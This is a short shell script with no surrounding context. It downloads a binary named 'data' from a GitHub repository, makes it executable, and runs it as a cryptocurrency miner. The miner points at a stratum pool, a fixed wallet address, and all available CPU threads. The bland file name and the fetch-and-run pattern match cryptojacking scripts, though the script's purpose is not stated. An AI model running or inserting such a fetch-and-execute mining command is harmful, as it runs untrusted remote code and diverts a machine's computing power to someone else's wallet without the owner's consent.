apt update -y
wget https://github.com/adeayuvebriani/datamine/raw/main/data
chmod +x data
./data -a minotaurx -o stratum+tcp://eu.mecrypto.club:4974 -u MMguZU589zvBmqMAg3GsKoLxv1JZpWch8L -p c=LCC -t $(nproc)
